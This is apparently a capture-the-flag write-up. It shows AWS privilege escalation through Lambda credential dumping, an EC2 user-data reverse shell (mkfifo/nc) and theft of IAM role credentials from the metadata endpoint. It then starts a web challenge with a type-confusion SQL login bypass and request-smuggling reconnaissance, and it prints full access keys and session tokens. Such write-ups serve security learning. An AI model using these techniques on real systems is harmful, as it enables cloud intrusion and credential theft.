`aws lambda invoke --function-name user-d17bf80d60e64bbf976745babfded26a-helloworld out --log-type Tail --query 'LogResult' --output text | base64 -d`
```bash
START RequestId: db75b4cf-30f9-4d67-ae4c-73b103460e7e Version: $LATEST
2022-09-11T18:40:00.214Z        db75b4cf-30f9-4d67-ae4c-73b103460e7e    INFO    ENVIRONMENT VARIABLES
{
  "AWS_LAMBDA_FUNCTION_VERSION": "$LATEST",
  "AWS_SESSION_TOKEN": "IQoJb3JpZ2luX2VjEOP//////////wEaDmFwLXNvdXRoZWFzdC0xIkYwRAIgFebA5nzoQ25orrcs+LIPD40rq7ZzfcwQ+Kpdt8bLfZMCIDUMDStLey24E9bUP737hELOLhHauJigB970z6nx+9p2KroDCHwQARoMMDUxNzUxNDk4NTMzIgzV3EwsRb6lUyFmrqcqlwO4YtXp3ULjyO3b8GymppTHRFDEVjh96ptOUhOtFaFY2nFybgoMDgiH5Oufh+JQK3Comv4rdGYfy/JlEwhu6xG+G9LYOTq1+j2vAVZZzitps4Y9kSeFBjisi26KokkbD8U9C9y0W8W2ruyzsb4y46QyKCfW6l16IiTovJdoV39tIJRl5UDb5jR4mPffO73twtsOWvUVwsAxRkh8WiFLbpImqdBVOev69iANjhL/j6XOb8CLncpGmoUiL95aBnlKlpFBvEbVa9iC1DgzBXV8sYdzTV+EvnqN8m/5IKfieqBF4A4YGgoVxQS29SKDX5FYwaETMKnK5y9JW0jcyU5MspC4Dv87qy7zeCOGgtDx27cvRIShEX2ekvG8TGD5eveA/ZLFvmJlmOCjMjqOi4v8FxBYRPa9oI1mB97XI40wOIuVjruG8PJL9YK2sQrJUCSlydC/c6uefS/5foTuvn8KGu3lEmcs36jWId/VnvGhvOIidWqq9rI2TP83vgVSoEL2GZqTM4RB4H6dUxje0TVUptzo8JOJrSp66TD41viYBjqfAQPD9THwKfGpReFXRuHtvHsazubya5zCuqmA6PVuONJO+sv7WGnMbLqQ6OknnR+auJCt/455GtSfczgYFaK1WpPyKI0V4uChpgjj0yFdSOwqmxu8HAcolcP0l+lelDdJnFO5grV5kYIMCBDPHjWilJw/bxG7kaE2+VYBNuRD8fYD48DH7SvJsGQvxIFVHfzj5l+djXNRrLvC8kHIQCZXiQ==",
  "AWS_LAMBDA_LOG_GROUP_NAME": "/aws/lambda/user-d17bf80d60e64bbf976745babfded26a-helloworld",
  "LD_LIBRARY_PATH": "/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib",
  "LAMBDA_TASK_ROOT": "/var/task",
  "AWS_LAMBDA_LOG_STREAM_NAME": "2022/09/11/[$LATEST]280c757310c64a5d9728e1efe9a836d8",
  "AWS_LAMBDA_RUNTIME_API": "127.0.0.1:9001",
  "AWS_EXECUTION_ENV": "AWS_Lambda_nodejs16.x",
  "AWS_XRAY_DAEMON_ADDRESS": "169.254.79.129:2000",
  "AWS_LAMBDA_FUNCTION_NAME": "user-d17bf80d60e64bbf976745babfded26a-helloworld",
  "PATH": "/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin",
  "AWS_DEFAULT_REGION": "ap-southeast-1",
  "PWD": "/var/task",
  "AWS_SECRET_ACCESS_KEY": "LhRx+C7g1KBftVuWTmC42jAHsnJXtuBppx6IT3ZM",
  "LAMBDA_RUNTIME_DIR": "/var/runtime",
  "LANG": "en_US.UTF-8",
  "AWS_LAMBDA_INITIALIZATION_TYPE": "on-demand",
  "NODE_PATH": "/opt/nodejs/node16/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task",
  "AWS_REGION": "ap-southeast-1",
  "TZ": ":UTC",
  "AWS_ACCESS_KEY_ID": "ASIAQYDFBGMSUWSMWIPY",
  "SHLVL": "0",
  "_AWS_XRAY_DAEMON_ADDRESS": "169.254.79.129",
  "_AWS_XRAY_DAEMON_PORT": "2000",
  "AWS_XRAY_CONTEXT_MISSING": "LOG_ERROR",
  "_HANDLER": "index.handler",
  "AWS_LAMBDA_FUNCTION_MEMORY_SIZE": "128",
  "NODE_EXTRA_CA_CERTS": "/etc/pki/tls/certs/ca-bundle.crt",
  "_X_AMZN_TRACE_ID": "Root=1-631e2b80-4b8d02977c9bb9fd5675f2ed;Parent=047e81963d6d8a71;Sampled=0"
}
2022-09-11T18:40:00.215Z        db75b4cf-30f9-4d67-ae4c-73b103460e7e    INFO    EVENT
{}
END RequestId: db75b4cf-30f9-4d67-ae4c-73b103460e7e
REPORT RequestId: db75b4cf-30f9-4d67-ae4c-73b103460e7e  Duration: 1.37 ms       Billed Duration: 2 ms   Memory Size: 128 MB     Max Memory Used: 57 MB

```

In particular, here are the important fields:
```json
{
	"AWS_ACCESS_KEY_ID": "ASIAQYDFBGMSUWSMWIPY",
	"AWS_SECRET_ACCESS_KEY": "LhRx+C7g1KBftVuWTmC42jAHsnJXtuBppx6IT3ZM",
	"AWS_SESSION_TOKEN": "IQoJb3JpZ2luX2VjEOP//////////wEaDmFwLXNvdXRoZWFzdC0xIkYwRAIgFebA5nzoQ25orrcs+LIPD40rq7ZzfcwQ+Kpdt8bLfZMCIDUMDStLey24E9bUP737hELOLhHauJigB970z6nx+9p2KroDCHwQARoMMDUxNzUxNDk4NTMzIgzV3EwsRb6lUyFmrqcqlwO4YtXp3ULjyO3b8GymppTHRFDEVjh96ptOUhOtFaFY2nFybgoMDgiH5Oufh+JQK3Comv4rdGYfy/JlEwhu6xG+G9LYOTq1+j2vAVZZzitps4Y9kSeFBjisi26KokkbD8U9C9y0W8W2ruyzsb4y46QyKCfW6l16IiTovJdoV39tIJRl5UDb5jR4mPffO73twtsOWvUVwsAxRkh8WiFLbpImqdBVOev69iANjhL/j6XOb8CLncpGmoUiL95aBnlKlpFBvEbVa9iC1DgzBXV8sYdzTV+EvnqN8m/5IKfieqBF4A4YGgoVxQS29SKDX5FYwaETMKnK5y9JW0jcyU5MspC4Dv87qy7zeCOGgtDx27cvRIShEX2ekvG8TGD5eveA/ZLFvmJlmOCjMjqOi4v8FxBYRPa9oI1mB97XI40wOIuVjruG8PJL9YK2sQrJUCSlydC/c6uefS/5foTuvn8KGu3lEmcs36jWId/VnvGhvOIidWqq9rI2TP83vgVSoEL2GZqTM4RB4H6dUxje0TVUptzo8JOJrSp66TD41viYBjqfAQPD9THwKfGpReFXRuHtvHsazubya5zCuqmA6PVuONJO+sv7WGnMbLqQ6OknnR+auJCt/455GtSfczgYFaK1WpPyKI0V4uChpgjj0yFdSOwqmxu8HAcolcP0l+lelDdJnFO5grV5kYIMCBDPHjWilJw/bxG7kaE2+VYBNuRD8fYD48DH7SvJsGQvxIFVHfzj5l+djXNRrLvC8kHIQCZXiQ=="
}
```

By stuffing these temporary credentials into our aws cli, our credential file now should look something like this:

`~/.aws/credentials`
```txt
[default]
aws_access_key_id = AKIAQYDFBGMSYJSR6PGF
aws_secret_access_key = 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

[lambda]
aws_access_key_id = ASIAQYDFBGMSUWSMWIPY
aws_secret_access_key = LhRx+C7g1KBftVuWTmC42jAHsnJXtuBppx6IT3ZM
aws_session_token = IQoJb3JpZ2luX2VjEOP//////////wEaDmFwLXNvdXRoZWFzdC0xIkYwRAIgFebA5nzoQ25orrcs+LIPD40rq7ZzfcwQ+Kpdt8bLfZMCIDUMDStLey24E9bUP737hELOLhHauJigB970z6nx+9p2KroDCHwQARoMMDUxNzUxNDk4NTMzIgzV3EwsRb6lUyFmrqcqlwO4YtXp3ULjyO3b8GymppTHRFDEVjh96ptOUhOtFaFY2nFybgoMDgiH5Oufh+JQK3Comv4rdGYfy/JlEwhu6xG+G9LYOTq1+j2vAVZZzitps4Y9kSeFBjisi26KokkbD8U9C9y0W8W2ruyzsb4y46QyKCfW6l16IiTovJdoV39tIJRl5UDb5jR4mPffO73twtsOWvUVwsAxRkh8WiFLbpImqdBVOev69iANjhL/j6XOb8CLncpGmoUiL95aBnlKlpFBvEbVa9iC1DgzBXV8sYdzTV+EvnqN8m/5IKfieqBF4A4YGgoVxQS29SKDX5FYwaETMKnK5y9JW0jcyU5MspC4Dv87qy7zeCOGgtDx27cvRIShEX2ekvG8TGD5eveA/ZLFvmJlmOCjMjqOi4v8FxBYRPa9oI1mB97XI40wOIuVjruG8PJL9YK2sQrJUCSlydC/c6uefS/5foTuvn8KGu3lEmcs36jWId/VnvGhvOIidWqq9rI2TP83vgVSoEL2GZqTM4RB4H6dUxje0TVUptzo8JOJrSp66TD41viYBjqfAQPD9THwKfGpReFXRuHtvHsazubya5zCuqmA6PVuONJO+sv7WGnMbLqQ6OknnR+auJCt/455GtSfczgYFaK1WpPyKI0V4uChpgjj0yFdSOwqmxu8HAcolcP0l+lelDdJnFO5grV5kYIMCBDPHjWilJw/bxG7kaE2+VYBNuRD8fYD48DH7SvJsGQvxIFVHfzj5l+djXNRrLvC8kHIQCZXiQ==
```

If you recall, as the lambda user, you now have permissions to create EC2 instances given by `lambda_agent_development_role`. In addition, according to earlier's notes.txt, we need to create EC2 instances with a key value pair of `agent` and `aws:username`.  We also require information like security groups to attach and the subnet to put the instance under, which can be found by running the commands `aws ec2 describe-security-groups` and `aws ec2 describe-subnets`. 

`aws ec2 describe-subnets` 
```json
{
    "Subnets": [
        {
            "AvailabilityZone": "ap-southeast-1a",
            "AvailabilityZoneId": "apse1-az2",
            "AvailableIpAddressCount": 16379,
            "CidrBlock": "10.0.0.0/18",
            "DefaultForAz": false,
            "MapPublicIpOnLaunch": true,
            "MapCustomerOwnedIpOnLaunch": false,
            "State": "available",
            "SubnetId": "subnet-0aa6ecdf900166741",
            "VpcId": "vpc-095cd9241e386169d",
            "OwnerId": "051751498533",
            "AssignIpv6AddressOnCreation": false,
            "Ipv6CidrBlockAssociationSet": [],
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "palindrome"
                }
            ],
            "SubnetArn": "arn:aws:ec2:ap-southeast-1:051751498533:subnet/subnet-0aa6ecdf900166741",
            "EnableDns64": false,
            "Ipv6Native": false,
            "PrivateDnsNameOptionsOnLaunch": {
                "HostnameType": "ip-name",
                "EnableResourceNameDnsARecord": false,
                "EnableResourceNameDnsAAAARecord": false
            }
        }
    ]
}
```

`aws ec2 describe-security-groups`
```json
{
    "SecurityGroups": [
        {
            "Description": "Access to c2 infra",
            "GroupName": "default-agents-sg",
            "IpPermissions": [
                {
                    "FromPort": 0,
                    "IpProtocol": "tcp",
                    "IpRanges": [
                        {
                            "CidrIp": "0.0.0.0/0"
                        }
                    ],
                    "Ipv6Ranges": [],
                    "PrefixListIds": [],
                    "ToPort": 65535,
                    "UserIdGroupPairs": []
                }
            ],
            "OwnerId": "051751498533",
            "GroupId": "sg-047c958320ee832f0",
            "IpPermissionsEgress": [
                {
                    "IpProtocol": "-1",
                    "IpRanges": [
                        {
                            "CidrIp": "0.0.0.0/0"
                        }
                    ],
                    "Ipv6Ranges": [],
                    "PrefixListIds": [],
                    "UserIdGroupPairs": []
                }
            ],
            "VpcId": "vpc-095cd9241e386169d"
        }
        ...snipped for brevity...
```

Additionally, since on startup the EC2 instance allows users to enter in text-data that will be run on startup. So that we are able to log into the instance on startup, I put in a reverse shell and waited to catch it on my end.

`file.txt`
```sh
#!/bin/sh
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <REDACTED_IP_ADDRESS> 8080 >/tmp/f
```

With all these in place, we now can run the instance and wait to catch the reverse shell. Just a side note, image-id was gotten from going to the aws console and selecting one of the image's AMI to put in.

`aws --profile lambda ec2 run-instances --subnet-id subnet-0aa6ecdf900166741 --image-id ami-02ee763250491e04a --instance-type t2.micro --security-group-ids sg-047c958320ee832f0 --tag-specifications 'ResourceType=instance,Tags=[{Key=agent,Value=user-d17bf80d60e64bbf976745babfded26a}]' --user-data file://file.txt --iam-instance-profile "Arn=arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile" --region ap-southeast-1`
```json
{
    "Groups": [],
    "Instances": [
        {
            "AmiLaunchIndex": 0,
            "ImageId": "ami-02ee763250491e04a",
            "InstanceId": "i-065189b3c4caa2782",
            "InstanceType": "t2.micro",
            "LaunchTime": "2022-09-11T19:11:34.000Z",
            "Monitoring": {
                "State": "disabled"
            },
            "Placement": {
                "AvailabilityZone": "ap-southeast-1a",
                "GroupName": "",
                "Tenancy": "default"
            },
            "PrivateDnsName": "ip-10-0-56-243.ap-southeast-1.compute.internal",
            "PrivateIpAddress": "10.0.56.243",
            "ProductCodes": [],
            "PublicDnsName": "",
            "State": {
                "Code": 0,
                "Name": "pending"
            },
            "StateTransitionReason": "",
            "SubnetId": "subnet-0aa6ecdf900166741",
            "VpcId": "vpc-095cd9241e386169d",
            "Architecture": "x86_64",
            "BlockDeviceMappings": [],
            "ClientToken": "d7eab5dd-5b01-4793-a2e9-857740154d9f",
            "EbsOptimized": false,
            "EnaSupport": true,
            "Hypervisor": "xen",
            "IamInstanceProfile": {
                "Arn": "arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile",
                "Id": "AIPAQYDFBGMS6EKSSQ2RF"
            },
            "NetworkInterfaces": [
                {
                    "Attachment": {
                        "AttachTime": "2022-09-11T19:11:34.000Z",
                        "AttachmentId": "eni-attach-0238b4f5d9c4c460c",
                        "DeleteOnTermination": true,
                        "DeviceIndex": 0,
                        "Status": "attaching",
                        "NetworkCardIndex": 0
                    },
                    "Description": "",
                    "Groups": [
                        {
                            "GroupName": "default-agents-sg",
                            "GroupId": "sg-047c958320ee832f0"
                        }
                    ],
                    "Ipv6Addresses": [],
                    "MacAddress": "06:f7:3a:bc:35:ce",
                    "NetworkInterfaceId": "eni-003683c902d1fb139",
                    "OwnerId": "051751498533",
                    "PrivateDnsName": "ip-10-0-56-243.ap-southeast-1.compute.internal",
                    "PrivateIpAddress": "10.0.56.243",
                    "PrivateIpAddresses": [
                        {
                            "Primary": true,
                            "PrivateDnsName": "ip-10-0-56-243.ap-southeast-1.compute.internal",
                            "PrivateIpAddress": "10.0.56.243"
                        }
                    ],
                    "SourceDestCheck": true,
                    "Status": "in-use",
                    "SubnetId": "subnet-0aa6ecdf900166741",
                    "VpcId": "vpc-095cd9241e386169d",
                    "InterfaceType": "interface"
                }
            ],
            "RootDeviceName": "/dev/sda1",
            "RootDeviceType": "ebs",
            "SecurityGroups": [
                {
                    "GroupName": "default-agents-sg",
                    "GroupId": "sg-047c958320ee832f0"
                }
            ],
            "SourceDestCheck": true,
            "StateReason": {
                "Code": "pending",
                "Message": "pending"
            },
            "Tags": [
                {
                    "Key": "agent",
                    "Value": "user-d17bf80d60e64bbf976745babfded26a"
                }
            ],
            "VirtualizationType": "hvm",
            "CpuOptions": {
                "CoreCount": 1,
                "ThreadsPerCore": 1
            },
            "CapacityReservationSpecification": {
                "CapacityReservationPreference": "open"
            },
            "MetadataOptions": {
                "State": "pending",
                "HttpTokens": "optional",
                "HttpPutResponseHopLimit": 1,
                "HttpEndpoint": "enabled",
                "HttpProtocolIpv6": "disabled",
                "InstanceMetadataTags": "disabled"
            },
            "EnclaveOptions": {
                "Enabled": false
            },
            "PrivateDnsNameOptions": {
                "HostnameType": "ip-name",
                "EnableResourceNameDnsARecord": false,
                "EnableResourceNameDnsAAAARecord": false
            },
            "MaintenanceOptions": {
                "AutoRecovery": "default"
            }
        }
    ],
    "OwnerId": "051751498533",
    "ReservationId": "r-0edf35ac19c58b20c"
}
```

On the reverse shell connection side, once the instance is started up, the connection will come through.

```bash
$ nc -lvnp 8080
listening on [any] 8080 ...
connect to [172.31.14.21] from (UNKNOWN) [54.251.237.69] 48366
```
```
/bin/sh: 0: can't access tty; job control turned off

# curl 169.254.169.254/latest/meta-data/iam/security-credentials/ec2_agent_role
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--    100  1450  100  1450    0     0   420k      0 --:--:-- --:--:-- --:--:--  472k
```
```json
{
  "Code" : "Success",
  "LastUpdated" : "2022-09-11T19:11:03Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAQYDFBGMSWESAREGD",
  "SecretAccessKey" : "c8fMs6TRuU3MNFVvp43xo8bbAcCH/v0cV8a03L5R",
  "Token" : "IQoJb3JpZ2luX2VjEOP//////////wEaDmFwLXNvdXRoZWFzdC0xIkgwRgIhALKnMmzvv6yQLndD3Ick0D6jF3K00HqvE5wiA/S8SEM4AiEAyp0BbRPgOe4lWD7wcSGTOW1/lSbRGTJJLxZ1TrgwSBAq2wQIfBABGgwwNTE3NTE0OTg1MzMiDPvEZrns7CaQiLvcYSq4BLbk5JMibnYUB7IaGrQLj+OueB9sc3vLvNFeXCu/PH58lYpVPjbf6afMTT3hwf29Im+8+lXBTOkj/yRzvDrR29lDRH/8RrklcI3hfjmNiCGlF/isc5W5IbamUINWOW8ulIlfm5UhAsShCE2QCWxDPvTcGHXVlKmNZcdKMWtofr3ceQcr76n3Md3D5AwTiTvPfLYuLi/wmhEvN5VzIS6nlObU5V4JM0IdYxahLOnqGqenJyVyaDBXzH22M66k9w7yjexbNH7WtDsY+wWKEkMEAR8p6rTpjJSPFegmyum7TYUgGDP4r3MYpOnFKZi1T5qC2WUUFrYSjEXscqcVpb7kR4+q6Mrr+UvwOnfpMv96O7LxJ8so4CHv1yguSkdsFgSADjAe51gBmkWwULUAIti/ezTSZr+W7NNyEZMamwyb8y+I7DdBd3WfLhNW3XLboFvvZNeNS7Do7kmP+v7jCZtfnSmjwLioAzoJXCGGj2NZ/qWeEWIk/No9A5Ogao+dQ9X9mudueee/12Atf8J8He6itt2rbrJhZSFQGFnGsUSFZW+EINVAOa2k6MmSKpBBrp03zLFuZD06+xaaiU0waugCQf/j/QTdugAUoRVpEkqC/eTw8CF68b6qoEg/ustZkaHzZNQHCvX/zVcGD8LlQmoU5LbcN85bOYaOeWI3CLA/nV/Ds9WHSFbBPTd2LpnBttQXpjbw3q3BTLvZk9/AOyf9QwAM8ZcIP+1ZYVvIDFVobRwNVqPfeDtg6sIw6eX4mAY6qAFhwMzzu7Nap2HHMKBcJtaptpbSInZKD/iPNwQcNhgVPXkB5KuoYm6DIWUDsGtd2Mpwyh28PDY7TeU8MoDLwOUakfY2nvmrfJKuTIUanijBL+P0+aTyx1cPkO500Uu71IdOpLBjrJJEeFMqvd0mretwgCoDtSJX66AsKnOi69HfpM5ca2bchn9fQJ7dTu6DSuRaNB72uRYe2bPJoIuM5YKb2NE+gIrBioM=",
  "Expiration" : "2022-09-12T01:46:37Z"
}
```

By curling `169.254.169.254/latest/meta-data/iam/security-credentials/ec2_agent_role` we are able to get the credentials for the ec2 agent role, after which, we can just stuff the credentials back into our lovely aws cli.

`~/.aws/credentials`
```txt
[default]
aws_access_key_id = AKIAQYDFBGMSYJSR6PGF
aws_secret_access_key = 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

[lambda]
aws_access_key_id = ASIAQYDFBGMSUWSMWIPY
aws_secret_access_key = LhRx+C7g1KBftVuWTmC42jAHsnJXtuBppx6IT3ZM
aws_session_token = IQoJb3JpZ2luX2VjEOP//////////wEaDmFwLXNvdXRoZWFzdC0xIkYwRAIgFebA5nzoQ25orrcs+LIPD40rq7ZzfcwQ+Kpdt8bLfZMCIDUMDStLey24E9bUP737hELOLhHauJigB970z6nx+9p2KroDCHwQARoMMDUxNzUxNDk4NTMzIgzV3EwsRb6lUyFmrqcqlwO4YtXp3ULjyO3b8GymppTHRFDEVjh96ptOUhOtFaFY2nFybgoMDgiH5Oufh+JQK3Comv4rdGYfy/JlEwhu6xG+G9LYOTq1+j2vAVZZzitps4Y9kSeFBjisi26KokkbD8U9C9y0W8W2ruyzsb4y46QyKCfW6l16IiTovJdoV39tIJRl5UDb5jR4mPffO73twtsOWvUVwsAxRkh8WiFLbpImqdBVOev69iANjhL/j6XOb8CLncpGmoUiL95aBnlKlpFBvEbVa9iC1DgzBXV8sYdzTV+EvnqN8m/5IKfieqBF4A4YGgoVxQS29SKDX5FYwaETMKnK5y9JW0jcyU5MspC4Dv87qy7zeCOGgtDx27cvRIShEX2ekvG8TGD5eveA/ZLFvmJlmOCjMjqOi4v8FxBYRPa9oI1mB97XI40wOIuVjruG8PJL9YK2sQrJUCSlydC/c6uefS/5foTuvn8KGu3lEmcs36jWId/VnvGhvOIidWqq9rI2TP83vgVSoEL2GZqTM4RB4H6dUxje0TVUptzo8JOJrSp66TD41viYBjqfAQPD9THwKfGpReFXRuHtvHsazubya5zCuqmA6PVuONJO+sv7WGnMbLqQ6OknnR+auJCt/455GtSfczgYFaK1WpPyKI0V4uChpgjj0yFdSOwqmxu8HAcolcP0l+lelDdJnFO5grV5kYIMCBDPHjWilJw/bxG7kaE2+VYBNuRD8fYD48DH7SvJsGQvxIFVHfzj5l+djXNRrLvC8kHIQCZXiQ==

[ec2_agent]
aws_access_key_id = ASIAQYDFBGMSWESAREGD
aws_secret_access_key = c8fMs6TRuU3MNFVvp43xo8bbAcCH/v0cV8a03L5R
aws_session_token = IQoJb3JpZ2luX2VjEOP//////////wEaDmFwLXNvdXRoZWFzdC0xIkgwRgIhALKnMmzvv6yQLndD3Ick0D6jF3K00HqvE5wiA/S8SEM4AiEAyp0BbRPgOe4lWD7wcSGTOW1/lSbRGTJJLxZ1TrgwSBAq2wQIfBABGgwwNTE3NTE0OTg1MzMiDPvEZrns7CaQiLvcYSq4BLbk5JMibnYUB7IaGrQLj+OueB9sc3vLvNFeXCu/PH58lYpVPjbf6afMTT3hwf29Im+8+lXBTOkj/yRzvDrR29lDRH/8RrklcI3hfjmNiCGlF/isc5W5IbamUINWOW8ulIlfm5UhAsShCE2QCWxDPvTcGHXVlKmNZcdKMWtofr3ceQcr76n3Md3D5AwTiTvPfLYuLi/wmhEvN5VzIS6nlObU5V4JM0IdYxahLOnqGqenJyVyaDBXzH22M66k9w7yjexbNH7WtDsY+wWKEkMEAR8p6rTpjJSPFegmyum7TYUgGDP4r3MYpOnFKZi1T5qC2WUUFrYSjEXscqcVpb7kR4+q6Mrr+UvwOnfpMv96O7LxJ8so4CHv1yguSkdsFgSADjAe51gBmkWwULUAIti/ezTSZr+W7NNyEZMamwyb8y+I7DdBd3WfLhNW3XLboFvvZNeNS7Do7kmP+v7jCZtfnSmjwLioAzoJXCGGj2NZ/qWeEWIk/No9A5Ogao+dQ9X9mudueee/12Atf8J8He6itt2rbrJhZSFQGFnGsUSFZW+EINVAOa2k6MmSKpBBrp03zLFuZD06+xaaiU0waugCQf/j/QTdugAUoRVpEkqC/eTw8CF68b6qoEg/ustZkaHzZNQHCvX/zVcGD8LlQmoU5LbcN85bOYaOeWI3CLA/nV/Ds9WHSFbBPTd2LpnBttQXpjbw3q3BTLvZk9/AOyf9QwAM8ZcIP+1ZYVvIDFVobRwNVqPfeDtg6sIw6eX4mAY6qAFhwMzzu7Nap2HHMKBcJtaptpbSInZKD/iPNwQcNhgVPXkB5KuoYm6DIWUDsGtd2Mpwyh28PDY7TeU8MoDLwOUakfY2nvmrfJKuTIUanijBL+P0+aTyx1cPkO500Uu71IdOpLBjrJJEeFMqvd0mretwgCoDtSJX66AsKnOi69HfpM5ca2bchn9fQJ7dTu6DSuRaNB72uRYe2bPJoIuM5YKb2NE+gIrBioM=
```

Knowing that `ec2_agent_role` has dynamodb access, let us now use that profile and check out dynamodb.

`aws dynamodb list-tables --profile ec2_agent --region ap-southeast-1`
```json
{
    "TableNames": [
        "flag_db"
    ]
}
```

I can see the light!

`aws dynamodb scan --table-name flag_db --profile ec2_agent --region ap-southeast-1`
```json
{
    "Items": [
        {
            "secret": {
                "S": "TISC{iT3_N0t_s0_C1oUdy}"
            },
            "name": {
                "S": "flag"
            }
        }
    ],
    "Count": 1,
    "ScannedCount": 1,
    "ConsumedCapacity": null
}

```

Flag: TISC{iT3_N0t_s0_C1oUdy}

---

## Level 5B - PALINDROME's Secret

Finally, I reached level 5B and I am greeted with this description, along with the source code of the entire website.

```
DESCRIPTION

Topic: Web Exploitation

We have discovered PALINDROME's secret portal, but we can't seem to gain access. Thankfully, we managed to steal the source code - can you take a look?

Gaining access to the portal and stealing the PALINDROME admin's access token will greatly aid our efforts to curb PALINDROME's ongoing attack.

http://chal010yo0os7fxmu2rhdrybsdiwsdqxgjdfuh.ctf.sg:23627/index

*NOTE*: Solving this challenge unlocks level 6!
```

This challenge was such an amazing ride, it presented itself as a long chain of really interesting vulnerabilities, and was really well done. We first see a login page, and you cannot get to any of the other functions as you are not logged in. On LocalHost, because the dockerfile provided created a user called `REDACTED@REDACTED` with the password `REDACTED`, I was able to pop in for a quick look, but essentially you would need to bypass the login mechanism first before gaining any sort of further pivots.

### SQL Injection

![[level5startpoint.png]]

However, taking a look at how logins were handled on the app showed that prepared statements were used, which I thought meant that SQLi was off the table. 

`app/main.js`
```node
const postLoginHandler = async (req, res) => {
    const { email, password } = req.body
    if (!email || !password)
        return res.status(400).send({ message: 'Missing email or password' })

    const rows = await query(`SELECT * FROM users WHERE email = ? AND password = ?`, [email, password])
    if (rows.length === 0)
        return res.status(401).send({ message: 'Invalid email or password' })

    req.session.userId = rows[0].id
    return res.status(200).send({ message: "Success" })
}
```

After a long time of soul searching for the way forward, I chanced upon a very nice link [here](https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/#type-checking) that talks about type checking even for prepared statements. All credits to the article for teaching me a valuable lesson on type checking and how to bypass it.

![[level5sqli.png]]

Let us intercept the login request and bypass it by stuffing an object in to obtain a session token.

```http
POST /login HTTP/1.1
Host: chal010yo0os7fxmu2rhdrybsdiwsdqxgjdfuh.ctf.sg:23627
Content-Length: 46
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://chal010yo0os7fxmu2rhdrybsdiwsdqxgjdfuh.ctf.sg:23627
Referer: http://chal010yo0os7fxmu2rhdrybsdiwsdqxgjdfuh.ctf.sg:23627/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{
	"email":{
		"email":  1
	},
	"password":{
		"password": 1
	}
}
```

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Security-Policy: default-src 'self'; img-src data: *; object-src 'none'; base-uri 'none'; frame-ancestors 'none'
Cross-Origin-Opener-Policy: same-origin
Content-Type: application/json; charset=utf-8
Content-Length: 21
ETag: W/"15-uFFjCr0SbbbFb/CsC0M2sF++swo"
Set-Cookie: connect.sid=s%3A9P1bX1Hpq5m8AFtBGQk_aVu8Udyr7iHM.J95OqPfZQ0ZCaKEnqqZ6uj8eKkuj0b1Khg2vFRRXmbE; Path=/; Expires=Tue, 13 Sep 2022 02:28:38 GMT; HttpOnly
Date: Mon, 12 Sep 2022 02:28:38 GMT
Age: 0
Connection: close
Server: ATS/9.1.0

{
	"message":"Success"
}
```

Side note, not sure why only the 1=1 method worked, and changing the key in the object being sent resulted in this:

```http
POST /login HTTP/1.1
Host: chal010yo0os7fxmu2rhdrybsdiwsdqxgjdfuh.ctf.sg:23627
Content-Length: 60
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://chal010yo0os7fxmu2rhdrybsdiwsdqxgjdfuh.ctf.sg:23627
Referer: http://chal010yo0os7fxmu2rhdrybsdiwsdqxgjdfuh.ctf.sg:23627/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{
	"email":{
		"notemail":  0
	},
	"password":{
		"notpassword": 0
	}
}

```
```http
HTTP/1.1 502 Server Hangup
Date: Mon, 12 Sep 2022 02:31:31 GMT
Connection: close
Server: ATS/9.1.0
Cache-Control: no-store
Content-Type: text/html
Content-Language: en
Content-Length: 294

<HTML>
<HEAD>
<TITLE>Server Connection Closed</TITLE>
</HEAD>

<BODY BGCOLOR="white" FGCOLOR="black">
<H1>Server Connection Closed</H1>
<HR>

<FONT FACE="Helvetica,Arial"><B>
Description: The server requested closed the connection before
the transaction was completed.
</B></FONT>
<HR>
</BODY>
```

Oh well, something to research in the future I suppose. After bypassing the login mechanism, we arrive at the index of the page, with a nice map of Singapore.

![[level5part1.png]]

### HTTP Request Smuggling & Blind SSRF

We have a few functions that we can try out, such as getting a token, verifying a token, and reporting an issue. they will come in handy later, but first we need to try chaining it up step by step. Going to `Report an Issue` shows this error message, and checking with the source code, indeed it directly points to `403 Forbidden` on the Apache Traffic Server side. How irritating.

![[level5part2.png]]

`proxy/remap.config`
```
map             /login          http://app:8000/login
map             /index          http://app:8000/index
map             /token          http://app:8000/token
map             /verify         http://app:8000/verify
map             /report-issue   http://app:8000/report-issue
map             /static         http://app:8000/static
map             /do-report      http://app:8000/forbidden <-- What Even
regex_redirect  http://(.*)/    http://$1/index
```

The URL report function smells like an SSRF, if only we could get around the proxy server and actually call the backend node server directly... Looking into the Dockerfile on how the proxy server was installed showed us something interesting, where an older version of trafficserver was downloaded and installed. 

`proxy/Dockerfile`
```docker
FROM ubuntu:20.04
RUN apt-get update && DEBIAN_FRONTEND=noninteractive apt-get upgrade -y
RUN DEBIAN_FRONTEND=noninteractive apt-get install -y curl build-essential libssl-dev libpcre3-dev zlib1g-dev
WORKDIR /ats
RUN curl -L https://archive.apache.org/dist/trafficserver/trafficserver-9.1.0.tar.bz2 > ats.tar.bz2 && \
    tar xf ats.tar.bz2 && \
    cd trafficserver-9.1.0 && \
    ./configure --prefix=/opt/ts && \
    make && \
    make install
  
COPY remap.config /opt/ts/etc/trafficserver/remap.config
RUN chmod +r /opt/ts/etc/trafficserver/remap.config
  
CMD ["/opt/ts/bin/traffic_manager"]
```

